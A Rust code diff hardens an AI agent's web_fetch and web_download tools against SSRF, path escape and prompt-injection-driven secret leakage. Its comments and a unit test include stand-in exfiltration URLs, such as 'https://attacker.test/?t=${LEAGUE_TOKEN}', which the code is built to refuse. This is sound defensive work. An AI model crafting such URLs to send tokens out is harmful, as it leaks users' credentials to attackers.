@@ -15,7 +15,7 @@ use tracing::{info, warn};
 
 use super::{
     platform::{detect_chrome, has_display},
-    runtime::{AgentRuntime, RunContext, expand_tilde},
+    runtime::{AgentRuntime, RunContext},
     web_parsers::{
         extract_html_title, html_dehydrate_to_text, is_captcha_page, lang_to_bing_mkt,
         parse_baidu_results, parse_bing_html_results, parse_ddg_results, parse_sogou_results,
@@ -76,19 +76,66 @@ fn host_of(url: &str) -> Option<String> {
 /// making it impossible to exfiltrate arbitrary env (API keys, etc.) via a
 /// crafted `${VAR}` in a URL — prompt-injection-safe by construction.
 fn fetch_env_allowed(name: &str) -> bool {
-    name.starts_with("LEAGUE_") || name.starts_with("FOOTBALL_")
+    fetch_env_prefix(name).is_some()
 }
 
-/// Substitute `${NAME}` from process env for allowlisted names only, at fetch
+/// Allowlisted prefix group of an env var name.
+fn fetch_env_prefix(name: &str) -> Option<&'static str> {
+    ["LEAGUE_", "FOOTBALL_"]
+        .into_iter()
+        .find(|p| name.starts_with(p))
+}
+
+/// Locator vars (`*_BASE`, `*_URL`, `*_HOST`) name WHERE a secret may be
+/// sent; they are not secrets themselves and expand anywhere.
+fn fetch_env_is_locator(name: &str) -> bool {
+    name.ends_with("_BASE") || name.ends_with("_URL") || name.ends_with("_HOST")
+}
+
+/// Lower-cased host of a locator value (`http://h:8080/v1` or bare `h`).
+fn locator_host(value: &str) -> Option<String> {
+    let v = value.trim();
+    let parsed = if v.contains("://") {
+        reqwest::Url::parse(v).ok()
+    } else {
+        reqwest::Url::parse(&format!("http://{v}")).ok()
+    };
+    parsed
+        .and_then(|u| u.host_str().map(|h| h.to_ascii_lowercase()))
+        .filter(|h| !h.is_empty())
+}
+
+/// Snapshot of the allowlisted env vars (`LEAGUE_*` / `FOOTBALL_*`).
+fn fetch_env_snapshot() -> Vec<(String, String)> {
+    std::env::vars()
+        .filter(|(k, _)| fetch_env_allowed(k))
+        .collect()
+}
+
+/// Substitute `${NAME}` from `vars` (an allowlisted env snapshot) at fetch
 /// time. Disallowed / unset placeholders are left VERBATIM (so a typo doesn't
 /// silently become empty, and non-allowlisted names can't leak). Applied to
-/// the OUTBOUND request only (fetch URL, header values, body) — never to the
-/// echoed response, so the resolved secret never returns to the LLM. UTF-8
-/// safe (slices at byte offsets from `find`, which land on char boundaries).
-fn expand_fetch_env(input: &str) -> String {
+/// the OUTBOUND request only (fetch URL, header values) — never to the
+/// echoed response, so the resolved secret never returns to the LLM.
+///
+/// Host binding: a secret var (anything that is not a `*_BASE` / `*_URL` /
+/// `*_HOST` locator) expands only when `target_host` equals the host of a
+/// locator var of the same prefix group (e.g. `LEAGUE_TOKEN` only goes to
+/// the host in `LEAGUE_API_BASE`). With `target_host = None` secrets are
+/// left verbatim (first pass, used to resolve the URL's own host); with a
+/// host that is not allowed, the call is refused so a prompt-injected
+/// `https://attacker/?t=${LEAGUE_TOKEN}` cannot exfiltrate the token.
+/// UTF-8 safe (slices at byte offsets from `find`, which land on char
+/// boundaries).
+fn expand_fetch_env_with(
+    input: &str,
+    target_host: Option<&str>,
+    vars: &[(String, String)],
+) -> Result<String> {
     if !input.contains("${") {
-        return input.to_owned();
+        return Ok(input.to_owned());
     }
+    let lookup = |name: &str| vars.iter().find(|(k, _)| k == name).map(|(_, v)| v.clone());
     let mut out = String::with_capacity(input.len());
     let mut rest = input;
     while let Some(start) = rest.find("${") {
@@ -96,11 +143,32 @@ fn expand_fetch_env(input: &str) -> String {
         let after = &rest[start + 2..];
         if let Some(end) = after.find('}') {
             let name = &after[..end];
-            let resolved = (!name.is_empty()
+            let valid = !name.is_empty()
                 && name.bytes().all(|c| c.is_ascii_alphanumeric() || c == b'_')
-                && fetch_env_allowed(name))
-            .then(|| std::env::var(name).ok())
-            .flatten();
+                && fetch_env_allowed(name);
+            let value = if valid { lookup(name) } else { None };
+            let resolved = match value {
+                Some(val) if fetch_env_is_locator(name) => Some(val),
+                Some(val) => match target_host {
+                    None => None,
+                    Some(host) => {
+                        let prefix = fetch_env_prefix(name).unwrap_or_default();
+                        let host = host.to_ascii_lowercase();
+                        let allowed = vars.iter().any(|(k, v)| {
+                            k.starts_with(prefix)
+                                && fetch_env_is_locator(k)
+                                && locator_host(v).as_deref() == Some(host.as_str())
+                        });
+                        if !allowed {
+                            bail!(
+                                "web_fetch: `${{{name}}}` may only be sent to the host configured in a {prefix}*_BASE / {prefix}*_URL variable, not to `{host}`"
+                            );
+                        }
+                        Some(val)
+                    }
+                },
+                None => None,
+            };
             match resolved {
                 Some(val) => out.push_str(&val),
                 None => {
@@ -116,7 +184,81 @@ fn expand_fetch_env(input: &str) -> String {
         }
     }
     out.push_str(rest);
-    out
+    Ok(out)
+}
+
+/// True when this turn may fetch private / loopback targets: the sender is
+/// an owner AND the operator opted in with `RSCLAW_WEB_FETCH_ALLOW_PRIVATE=1`
+/// (local dev servers). Never for non-owners.
+pub(crate) fn web_allow_private(trust: crate::trust::SenderTrust) -> bool {
+    trust.is_owner()
+        && std::env::var("RSCLAW_WEB_FETCH_ALLOW_PRIVATE")
+            .is_ok_and(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+}
+
+/// Build a client for one hop to `url`: SSRF-vetted and DNS-pinned via
+/// `rsclaw_util::net`, unless `allow_private` (then only the scheme is
+/// checked). Redirects are never followed automatically.
+async fn hop_client(
+    base: reqwest::ClientBuilder,
+    url: &reqwest::Url,
+    timeout: Duration,
+    allow_private: bool,
+) -> Result<reqwest::Client> {
+    if allow_private {
+        if !matches!(url.scheme(), "http" | "https") {
+            bail!("url scheme `{}` is not allowed (http/https only)", url.scheme());
+        }
+        return base
+            .redirect(reqwest::redirect::Policy::none())
+            .timeout(timeout)
+            .build()
+            .map_err(|e| anyhow!("http client build failed: {e}"));
+    }
+    let addrs = rsclaw_util::net::resolve_public_url(url).await?;
+    rsclaw_util::net::pinned_client(base, url, &addrs, timeout)
+}
+
+/// Send `req` with SSRF protection ([`rsclaw_util::net::safe_send`]); when
+/// `allow_private` (owner opt-in, see [`web_allow_private`]) private targets
+/// are allowed but redirects are still bounded and the scheme checked.
+pub(crate) async fn send_guarded(
+    base: impl Fn() -> reqwest::ClientBuilder,
+    req: rsclaw_util::net::SafeRequest,
+    allow_private: bool,
+) -> Result<reqwest::Response> {
+    if !allow_private {
+        return rsclaw_util::net::safe_send(base, req).await;
+    }
+    let parsed = reqwest::Url::parse(&req.url).map_err(|e| anyhow!("invalid url: {e}"))?;
+    if !matches!(parsed.scheme(), "http" | "https") {
+        bail!("url scheme `{}` is not allowed (http/https only)", parsed.scheme());
+    }
+    let client = base()
+        .redirect(reqwest::redirect::Policy::limited(req.max_redirects))
+        .timeout(req.timeout)
+        .build()
+        .map_err(|e| anyhow!("http client build failed: {e}"))?;
+    let mut rb = client.request(req.method, parsed).headers(req.headers);
+    if let Some(b) = req.body {
+        rb = rb.body(b);
+    }
+    Ok(rb.send().await?)
+}
+
+/// Decode a response body using the `charset` from its Content-Type
+/// (defaults to UTF-8), like `reqwest::Response::text` does.
+fn decode_body(bytes: &[u8], content_type: &str) -> String {
+    let label = content_type
+        .split(';')
+        .filter_map(|p| p.trim().strip_prefix("charset="))
+        .next()
+        .map(|c| c.trim_matches('"'));
+    let encoding = label
+        .and_then(|l| encoding_rs::Encoding::for_label(l.as_bytes()))
+        .unwrap_or(encoding_rs::UTF_8);
+    let (text, _, _) = encoding.decode(bytes);
+    text.into_owned()
 }
 
 /// LRU cache of hosts that already had their site rule surfaced to the
@@ -718,22 +860,31 @@ impl AgentRuntime {
 
         // 2. Fetch page bodies concurrently with a strict per-fetch timeout (reqwest's
         //    own timeout); reuse the HTML→text dehydrator.
-        let client = match reqwest::Client::builder()
-            .user_agent(DEEP_FETCH_UA)
-            .timeout(Duration::from_millis(DEEP_PER_FETCH_TIMEOUT_MS))
-            .build()
-        {
-            Ok(c) => c,
-            Err(e) => {
-                warn!(error = %e, "deep_web_search: client build failed; returning snippets");
-                return Ok(raw);
-            }
-        };
+        //    Result URLs come from third-party pages, so each fetch goes
+        //    through the SSRF guard and the body read is capped.
+        const DEEP_MAX_PAGE_BYTES: usize = 4 * 1024 * 1024;
         let mut pages: Vec<(usize, String, String, String)> =
             futures::stream::iter(hits.into_iter().enumerate().map(|(idx, (title, url))| {
-                let client = client.clone();
                 async move {
-                    let body = client.get(&url).send().await.ok()?.text().await.ok()?;
+                    let mut req = rsclaw_util::net::SafeRequest::get(url.clone());
+                    req.timeout = Duration::from_millis(DEEP_PER_FETCH_TIMEOUT_MS);
+                    let resp = rsclaw_util::net::safe_send(
+                        || reqwest::Client::builder().user_agent(DEEP_FETCH_UA),
+                        req,
+                    )
+                    .await
+                    .ok()?;
+                    let content_type = resp
+                        .headers()
+                        .get(reqwest::header::CONTENT_TYPE)
+                        .and_then(|v| v.to_str().ok())
+                        .unwrap_or("")
+                        .to_owned();
+                    let (bytes, _truncated) =
+                        rsclaw_util::net::read_body_truncated(resp, DEEP_MAX_PAGE_BYTES)
+                            .await
+                            .ok()?;
+                    let body = decode_body(&bytes, &content_type);
                     let text = crate::web_parsers::html_dehydrate_to_text(&body);
                     if text.trim().chars().count() < 200 {
                         return None; // SPA / blocked / empty — skip (no browser fallback in deep mode for latency)
@@ -1043,6 +1194,18 @@ impl AgentRuntime {
             .map_err(|_| anyhow!("web_fetch: invalid HTTP method `{method_str}`"))?;
         let is_get = method == reqwest::Method::GET;
 
+        // Interpolate allowlisted ${LEAGUE_*}/${FOOTBALL_*} env into the
+        // OUTBOUND url only (the echoed `url` stays literal, so a resolved
+        // token never returns to the LLM). Two passes: locator vars first
+        // to learn the real target host, then secrets bound to that host.
+        // See expand_fetch_env_with.
+        let env_vars = fetch_env_snapshot();
+        let url_pass1 = expand_fetch_env_with(url, None, &env_vars)?;
+        let target_host = reqwest::Url::parse(&url_pass1)
+            .ok()
+            .and_then(|u| u.host_str().map(|h| h.to_ascii_lowercase()));
+        let fetch_url = expand_fetch_env_with(&url_pass1, target_host.as_deref(), &env_vars)?;
+
         // Optional headers map. Used for Authorization, X-API-Key, custom
         // content-types, etc. Reserved hop-by-hop headers (Host,
         // Content-Length, Transfer-Encoding, Connection) are silently
@@ -1059,8 +1222,9 @@ impl AgentRuntime {
                     bail!("web_fetch: header `{k}` value must be a string");
                 };
                 // Allowlisted env interpolation (e.g. `Bearer ${LEAGUE_TOKEN}`)
-                // so the agent can auth with a secret it never sees in plaintext.
-                let val_str = expand_fetch_env(val_raw);
+                // so the agent can auth with a secret it never sees in
+                // plaintext — only toward the var's configured host.
+                let val_str = expand_fetch_env_with(val_raw, target_host.as_deref(), &env_vars)?;
                 let name = reqwest::header::HeaderName::try_from(k.as_str())
                     .map_err(|_| anyhow!("web_fetch: invalid header name `{k}`"))?;
                 let val = reqwest::header::HeaderValue::try_from(val_str.as_str())
@@ -1073,6 +1237,20 @@ impl AgentRuntime {
         // caller already provided one. String → raw body (caller controls
         // Content-Type via headers). Anything else → error.
         let body_value = args.get("body").cloned();
+        let body_bytes: Option<Vec<u8>> = match body_value.as_ref() {
+            None | Some(Value::Null) => None,
+            Some(Value::String(s)) => Some(s.clone().into_bytes()),
+            Some(v @ (Value::Object(_) | Value::Array(_))) => {
+                if !headers.contains_key(reqwest::header::CONTENT_TYPE) {
+                    headers.insert(
+                        reqwest::header::CONTENT_TYPE,
+                        reqwest::header::HeaderValue::from_static("application/json"),
+                    );
+                }
+                Some(serde_json::to_vec(v)?)
+            }
+            Some(_) => bail!("web_fetch: `body` must be a string, object, or array"),
+        };
 
         let wf_cfg = self
             .live
@@ -1101,10 +1279,6 @@ impl AgentRuntime {
         // errors out. Sites that want TLS redirect http→https on their own,
         // and the same-host redirect policy below follows that for GETs, so the
         // common "model emitted http:// for an https site" case still works.
-        // Interpolate allowlisted ${LEAGUE_*}/${FOOTBALL_*} env into the OUTBOUND
-        // url only (the echoed `url` stays literal, so a resolved token never
-        // returns to the LLM). See expand_fetch_env.
-        let fetch_url = expand_fetch_env(url);
 
         // Cache lookup is GET-only. POST/PUT/PATCH/DELETE skip the cache
         // since they may have side effects, carry per-call auth, or be
@@ -1130,7 +1304,15 @@ impl AgentRuntime {
             }
         }
 
-        // Build HTTP client with method-aware, same-host-only redirect policy.
+        // SSRF guard: every hop's target is resolved and must be a public
+        // address (DNS-pinned so a rebinding answer cannot swap it), unless
+        // an owner opted in to private targets (RSCLAW_WEB_FETCH_ALLOW_PRIVATE).
+        // A blocked target is returned as an error — no browser fallback,
+        // which would happily load loopback / metadata URLs (or file://).
+        let allow_private = web_allow_private(ctx.turn_ctx.trust);
+
+        // Redirects are followed manually, re-validating each hop, with a
+        // method-aware, same-host-only policy:
         //
         // GET: same-host follow (cross-host stops and surfaces the redirect).
         // Non-GET on 307/308: follow (RFC-mandated method preservation, same-
@@ -1141,89 +1323,79 @@ impl AgentRuntime {
         //                     headers to a different endpoint than the LLM
         //                     intended. Returning the 30x to the caller lets
         //                     the LLM decide whether to re-issue as POST/GET.
-        let original_host = reqwest::Url::parse(&fetch_url)
-            .ok()
-            .and_then(|u| u.host_str().map(|h| h.to_owned()));
-        let policy_is_get = is_get;
-        let redirect_policy = reqwest::redirect::Policy::custom(move |attempt| {
-            if attempt.previous().len() > 10 {
-                return attempt.error(anyhow!("too many redirects"));
+        let mut current = reqwest::Url::parse(&fetch_url)
+            .map_err(|e| anyhow!("web_fetch: invalid url `{url}`: {e}"))?;
+        let strip_www = |h: &str| h.strip_prefix("www.").unwrap_or(h).to_ascii_lowercase();
+        let original_host = current.host_str().map(strip_www).unwrap_or_default();
+        let mut hops = 0usize;
+        let response = loop {
+            let client = hop_client(
+                reqwest::Client::builder().user_agent(&user_agent),
+                &current,
+                Duration::from_secs(30),
+                allow_private,
+            )
+            .await
+            .map_err(|e| anyhow!("web_fetch: blocked `{}`: {e}", current.as_str()))?;
+            let mut req = client.request(method.clone(), current.clone());
+            if !headers.is_empty() {
+                req = req.headers(headers.clone());
             }
-            let new_host = attempt.url().host_str().unwrap_or("");
-            let strip_www = |h: &str| h.strip_prefix("www.").unwrap_or(h).to_owned();
-            let orig = original_host.as_deref().map(strip_www).unwrap_or_default();
-            let same_host = strip_www(new_host) == orig;
-            if !same_host {
-                return attempt.stop();
+            if let Some(b) = body_bytes.as_ref() {
+                req = req.body(b.clone());
             }
-            if policy_is_get {
-                return attempt.follow();
-            }
-            // Non-GET, same-host: only follow method-preserving redirects.
-            let status = attempt.status().as_u16();
-            if status == 307 || status == 308 {
-                attempt.follow()
-            } else {
-                attempt.stop()
-            }
-        });
-
-        let client = reqwest::Client::builder()
-            .user_agent(&user_agent)
-            .timeout(Duration::from_secs(30))
-            .redirect(redirect_policy)
-            .build()?;
-
-        // Build request: method + url + headers + body.
-        let mut req = client.request(method.clone(), &fetch_url);
-        if !headers.is_empty() {
-            req = req.headers(headers.clone());
-        }
-        if let Some(body) = body_value.as_ref() {
-            match body {
-                Value::String(s) => {
-                    req = req.body(s.clone());
-                }
-                Value::Object(_) | Value::Array(_) => {
-                    // JSON body: reqwest's `.json()` sets Content-Type for us
-                    // unless the caller already provided one.
-                    req = req.json(body);
-                }
-                _ => bail!("web_fetch: `body` must be a string, object, or array"),
-            }
-        }
-
-        let response = match req.send().await {
-            Ok(r) => r,
-            Err(e) => {
-                // For non-GET, browser fallback is meaningless (it can only
-                // replay GETs). Surface the error directly.
-                if !is_get {
-                    return Err(e.into());
-                }
-                // HTTP request failed — try browser fallback before giving up.
-                tracing::warn!(url = %fetch_url, error = %e, "web_fetch: HTTP failed, trying browser fallback");
-                match self.browser_get_article(&fetch_url).await {
-                    Ok((t, md)) if !md.is_empty() => {
-                        let raw_chars = md.chars().count();
-                        let raw_artifact = self
-                            .preserve_raw_for_summarize(&ctx.session_key, &md, prompt)
-                            .await;
-                        let text = self.maybe_summarize(&md, prompt).await;
-                        FETCH_CACHE.insert(fetch_url, (t.clone(), md)).await;
-                        let mut out = json!({
-                            "url": url,
-                            "title": t,
-                            "text": text,
-                            "length": text.len(),
-                            "source": "browser_fallback",
-                        });
-                        attach_raw_artifact(&mut out, raw_artifact, raw_chars);
-                        return Ok(out);
+            let resp = match req.send().await {
+                Ok(r) => r,
+                Err(e) => {
+                    // For non-GET, browser fallback is meaningless (it can only
+                    // replay GETs). Surface the error directly.
+                    if !is_get {
+                        return Err(e.into());
                     }
-                    _ => return Err(e.into()),
+                    // HTTP request failed — try browser fallback before giving
+                    // up. The URL already passed the SSRF check above.
+                    tracing::warn!(url = %current, error = %e, "web_fetch: HTTP failed, trying browser fallback");
+                    match self.browser_get_article(current.as_str()).await {
+                        Ok((t, md)) if !md.is_empty() => {
+                            let raw_chars = md.chars().count();
+                            let raw_artifact = self
+                                .preserve_raw_for_summarize(&ctx.session_key, &md, prompt)
+                                .await;
+                            let text = self.maybe_summarize(&md, prompt).await;
+                            FETCH_CACHE.insert(fetch_url, (t.clone(), md)).await;
+                            let mut out = json!({
+                                "url": url,
+                                "title": t,
+                                "text": text,
+                                "length": text.len(),
+                                "source": "browser_fallback",
+                            });
+                            attach_raw_artifact(&mut out, raw_artifact, raw_chars);
+                            return Ok(out);
+                        }
+                        _ => return Err(e.into()),
+                    }
                 }
+            };
+            if !resp.status().is_redirection() || hops >= 10 {
+                break resp;
             }
+            let Some(next) = resp
+                .headers()
+                .get(reqwest::header::LOCATION)
+                .and_then(|v| v.to_str().ok())
+                .and_then(|loc| current.join(loc).ok())
+            else {
+                break resp;
+            };
+            let same_host = next.host_str().map(strip_www).unwrap_or_default() == original_host;
+            let status = resp.status().as_u16();
+            let follow = same_host && (is_get || status == 307 || status == 308);
+            if !follow {
+                break resp;
+            }
+            hops += 1;
+            current = next;
         };
 
         // Surface unfollowed redirects to the caller. Two cases reach here:
@@ -1257,8 +1429,9 @@ impl AgentRuntime {
         }
 
         // Enforce 10 MB content-length limit.
+        const MAX_FETCH_BYTES: usize = 10 * 1024 * 1024;
         if let Some(len) = response.content_length() {
-            if len > 10 * 1024 * 1024 {
+            if len > MAX_FETCH_BYTES as u64 {
                 bail!(
                     "web_fetch: content too large ({len} bytes, max 10MB). web_fetch reads pages into context — use web_download to save this URL to a file instead"
                 );
@@ -1270,11 +1443,11 @@ impl AgentRuntime {
         // empty-body SPA detection below.
         if !response.status().is_success() && is_get {
             tracing::warn!(
-                url = %fetch_url,
+                url = %current,
                 status = %response.status(),
                 "web_fetch: non-success status, trying browser fallback"
             );
-            match self.browser_get_article(&fetch_url).await {
+            match self.browser_get_article(current.as_str()).await {
                 Ok((t, md)) if !md.is_empty() => {
                     let raw_chars = md.chars().count();
                     let raw_artifact = self
@@ -1301,7 +1474,16 @@ impl AgentRuntime {
             .and_then(|v| v.to_str().ok())
             .unwrap_or("")
             .to_owned();
-        let html = response.text().await?;
+        // Streamed, bounded read: chunked responses carry no Content-Length,
+        // so the check above alone does not bound memory.
+        let body = rsclaw_util::net::read_body_limited(response, MAX_FETCH_BYTES)
+            .await
+            .map_err(|e| {
+                anyhow!(
+                    "web_fetch: {e}. web_fetch reads pages into context — use web_download to save this URL to a file instead"
+                )
+            })?;
+        let html = decode_body(&body, &content_type);
 
         let title = extract_html_title(&html);
 
@@ -1334,7 +1516,7 @@ impl AgentRuntime {
         let (final_title, final_md) = if is_get && (is_spa || is_captcha) {
             // Browser fallback only makes sense for GET — POST/PUT can't be
             // safely replayed in a browser tab.
-            match self.browser_get_article(&fetch_url).await {
+            match self.browser_get_article(current.as_str()).await {
                 Ok((t, md)) if !md.is_empty() => (t, md),
                 _ => (title.clone(), markdown.clone()),
             }
@@ -1422,6 +1604,14 @@ impl AgentRuntime {
 
     /// Use web_browser to fetch JS-rendered page content via get_article.
     pub(crate) async fn browser_get_article(&self, url: &str) -> Result<(String, String)> {
+        // Chrome would happily render file://, chrome://, data: ... — the
+        // fallback is only for web pages.
+        let scheme_ok = reqwest::Url::parse(url)
+            .map(|u| matches!(u.scheme(), "http" | "https"))
+            .unwrap_or(false);
+        if !scheme_ok {
+            bail!("browser fallback only supports http(s) URLs");
+        }
         let tab = rsclaw_browser::pool::BrowserPool::global()
             .acquire_tab()
             .await?;
@@ -1705,35 +1895,51 @@ impl AgentRuntime {
         }
     }
 
-    pub(crate) async fn tool_web_download(&self, args: Value) -> Result<Value> {
+    pub(crate) async fn tool_web_download(&self, ctx: &RunContext, args: Value) -> Result<Value> {
         let url = args["url"]
             .as_str()
-            .ok_or_else(|| anyhow!("web_download: `url` required"))?;
+            .ok_or_else(|| anyhow!("web_download: `url` required"))?
+            .trim();
         let path_str = args["path"]
             .as_str()
-            .ok_or_else(|| anyhow!("web_download: `path` required"))?;
+            .ok_or_else(|| anyhow!("web_download: `path` required"))?
+            .trim();
 
         // Resolve path: always under workspace/downloads.
         // Strip common prefixes that models hallucinate (~/Downloads/, ~/,
-        // /workspace/).
+        // /workspace/), then confine the rest to the downloads dir — `..`,
+        // absolute paths and symlinks cannot leave it.
         let mut cleaned = path_str
             .trim_start_matches("~/Downloads/")
             .trim_start_matches("~/downloads/")
             .trim_start_matches("~/")
             .trim_start_matches("/workspace/")
-            .trim_start_matches("/");
+            .trim_start_matches('/');
         if cleaned.is_empty() {
             cleaned = "download";
         }
-        let workspace = self
-            .handle
-            .config
-            .workspace
-            .as_deref()
-            .or(self.config.agents.defaults.workspace.as_deref())
-            .map(expand_tilde)
-            .unwrap_or_else(|| rsclaw_config::loader::base_dir().join("workspace"));
-        let full = workspace.join("downloads").join(cleaned);
+        let downloads_root = self.default_workspace().join("downloads");
+        tokio::fs::create_dir_all(&downloads_root)
+            .await
+            .map_err(|e| {
+                anyhow!(
+                    "web_download: cannot create directory {}: {e}",
+                    downloads_root.display()
+                )
+            })?;
+        let full = rsclaw_util::fs_guard::resolve_within(&downloads_root, cleaned).map_err(|_| {
+            anyhow!(
+                "web_download: `path` must stay inside the workspace downloads/ directory (got `{path_str}`)"
+            )
+        })?;
+        super::security::check_write_safety(path_str, &full, "")?;
+        let file_name = full
+            .file_name()
+            .map(|f| f.to_string_lossy().into_owned())
+            .ok_or_else(|| anyhow!("web_download: `path` must name a file"))?;
+        // Partial downloads live next to the target as `<name>.part`; only
+        // those are ever resumed/appended to, never an existing file.
+        let part = full.with_file_name(format!("{file_name}.part"));
 
         // Ensure parent directory exists.
         if let Some(parent) = full.parent() {
@@ -1789,19 +1995,23 @@ impl AgentRuntime {
             }
         }
 
-        let client = reqwest::Client::builder()
-            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
-            .timeout(Duration::from_secs(300))
-            .build()?;
-
-        // Resume support: if file exists, try Range request to continue download.
-        let existing_size = tokio::fs::metadata(&full)
-            .await
-            .map(|m| m.len())
-            .unwrap_or(0);
-        let mut req = client.get(url);
+        // Resume support: only a `.part` file left by an earlier interrupted
+        // download is continued via Range.
+        let existing_size = match tokio::fs::symlink_metadata(&part).await {
+            Ok(m) if m.is_file() => m.len(),
+            _ => 0,
+        };
+        let mut headers = reqwest::header::HeaderMap::new();
+        let mut put_header = |name: reqwest::header::HeaderName, value: &str| {
+            match reqwest::header::HeaderValue::from_str(value) {
+                Ok(v) => {
+                    headers.insert(name, v);
+                }
+                Err(e) => tracing::warn!(header = %name, error = %e, "web_download: invalid header value dropped"),
+            }
+        };
         if !cookie_header.is_empty() {
-            req = req.header("Cookie", &cookie_header);
+            put_header(reqwest::header::COOKIE, &cookie_header);
         }
         // Set Referer — use the caller-supplied value if present, else
         // default to the URL's own origin. Domain-specific Referer rules
@@ -1810,20 +2020,41 @@ impl AgentRuntime {
         // by this generic skill — if you're hitting one of those CDNs,
         // route through the relevant plugin instead of this tool.
         if let Some(referer) = args["referer"].as_str() {
-            req = req.header("Referer", referer);
+            put_header(reqwest::header::REFERER, referer);
         } else if let Ok(parsed) = reqwest::Url::parse(url) {
             if let Some(host) = parsed.host_str() {
-                req = req.header("Referer", format!("{}://{}/", parsed.scheme(), host));
+                put_header(
+                    reqwest::header::REFERER,
+                    &format!("{}://{}/", parsed.scheme(), host),
+                );
             }
         }
         if existing_size > 0 {
-            req = req.header("Range", format!("bytes={existing_size}-"));
+            put_header(reqwest::header::RANGE, &format!("bytes={existing_size}-"));
         }
 
-        let resp = req
-            .send()
-            .await
-            .map_err(|e| anyhow!("web_download: request failed: {e}"))?;
+        // SSRF-safe: public targets only (every redirect hop re-checked),
+        // unless an owner opted in to private targets.
+        let req = rsclaw_util::net::SafeRequest {
+            method: reqwest::Method::GET,
+            url: url.to_owned(),
+            headers,
+            body: None,
+            timeout: Duration::from_secs(300),
+            max_redirects: rsclaw_util::net::DEFAULT_MAX_REDIRECTS,
+        };
+        let allow_private = web_allow_private(ctx.turn_ctx.trust);
+        let resp = send_guarded(
+            || {
+                reqwest::Client::builder().user_agent(
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+                )
+            },
+            req,
+            allow_private,
+        )
+        .await
+        .map_err(|e| anyhow!("web_download: request failed: {e}"))?;
 
         if !resp.status().is_success() && resp.status().as_u16() != 206 {
             bail!(
@@ -1845,27 +2076,44 @@ impl AgentRuntime {
             );
         }
 
-        let resumed = resp.status().as_u16() == 206;
+        // A 206 only continues our `.part` when it starts where it ends.
+        let resumed = resp.status().as_u16() == 206
+            && existing_size > 0
+            && resp
+                .headers()
+                .get(reqwest::header::CONTENT_RANGE)
+                .and_then(|v| v.to_str().ok())
+                .and_then(|v| v.strip_prefix("bytes "))
+                .and_then(|v| v.split('-').next())
+                .and_then(|start| start.trim().parse::<u64>().ok())
+                == Some(existing_size);
+        if resp.status().as_u16() == 206 && !resumed {
+            bail!(
+                "web_download: server answered with a partial range that does not continue the previous download. Delete `{}` and retry.",
+                part.display()
+            );
+        }
 
-        // Stream to file (low memory). Append if resuming, create otherwise.
+        // Stream to the `.part` file (low memory). Append if resuming,
+        // truncate otherwise; rename onto the target when complete.
         let mut stream = resp.bytes_stream();
         use futures::StreamExt;
         use tokio::io::AsyncWriteExt;
         let mut file = if resumed {
             tokio::fs::OpenOptions::new()
                 .append(true)
-                .open(&full)
+                .open(&part)
                 .await
                 .map_err(|e| {
                     anyhow!(
                         "web_download: cannot open for append {}: {e}",
-                        full.display()
+                        part.display()
                     )
                 })?
         } else {
-            tokio::fs::File::create(&full)
+            tokio::fs::File::create(&part)
                 .await
-                .map_err(|e| anyhow!("web_download: cannot create {}: {e}", full.display()))?
+                .map_err(|e| anyhow!("web_download: cannot create {}: {e}", part.display()))?
         };
         let mut downloaded: u64 = 0;
         while let Some(chunk) = stream.next().await {
@@ -1878,8 +2126,19 @@ impl AgentRuntime {
             downloaded += chunk.len() as u64;
         }
         file.flush().await?;
+        drop(file);
+        tokio::fs::rename(&part, &full).await.map_err(|e| {
+            anyhow!(
+                "web_download: cannot move {} into place: {e}",
+                part.display()
+            )
+        })?;
 
-        let total = existing_size + downloaded;
+        let total = if resumed {
+            existing_size + downloaded
+        } else {
+            downloaded
+        };
         Ok(json!({
             "status": "ok",
             "path": full.to_string_lossy(),
@@ -3320,5 +3579,48 @@ mod deep_search_tests {
             .join("\n\n");
         let chunks = deep_chunk(&text);
         assert!(chunks.len() <= 40, "cap breached: {}", chunks.len());
+    }
+}
+
+#[cfg(test)]
+mod fetch_env_tests {
+    use super::expand_fetch_env_with;
+
+    fn vars() -> Vec<(String, String)> {
+        vec![
+            ("LEAGUE_API_BASE".to_owned(), "http://api.example.com:8080".to_owned()),
+            ("LEAGUE_TOKEN".to_owned(), "s3cret".to_owned()),
+        ]
+    }
+
+    #[test]
+    fn web_fetch_env_secret_bound_to_locator_host() {
+        let v = vars();
+        // Pass 1 resolves locators only; the secret stays verbatim.
+        let p1 = expand_fetch_env_with("${LEAGUE_API_BASE}/submit?t=${LEAGUE_TOKEN}", None, &v)
+            .expect("pass1");
+        assert_eq!(p1, "http://api.example.com:8080/submit?t=${LEAGUE_TOKEN}");
+        let p2 = expand_fetch_env_with(&p1, Some("api.example.com"), &v).expect("pass2");
+        assert_eq!(p2, "http://api.example.com:8080/submit?t=s3cret");
+        // Header value toward the right host expands.
+        assert_eq!(
+            expand_fetch_env_with("Bearer ${LEAGUE_TOKEN}", Some("api.example.com"), &v)
+                .expect("hdr"),
+            "Bearer s3cret"
+        );
+    }
+
+    #[test]
+    fn web_fetch_env_secret_refused_for_other_hosts() {
+        let v = vars();
+        assert!(
+            expand_fetch_env_with("https://attacker.test/?t=${LEAGUE_TOKEN}", Some("attacker.test"), &v)
+                .is_err()
+        );
+        // Non-allowlisted names are never expanded.
+        assert_eq!(
+            expand_fetch_env_with("${OPENAI_API_KEY}", Some("api.example.com"), &v).expect("ok"),
+            "${OPENAI_API_KEY}"
+        );
     }
 }
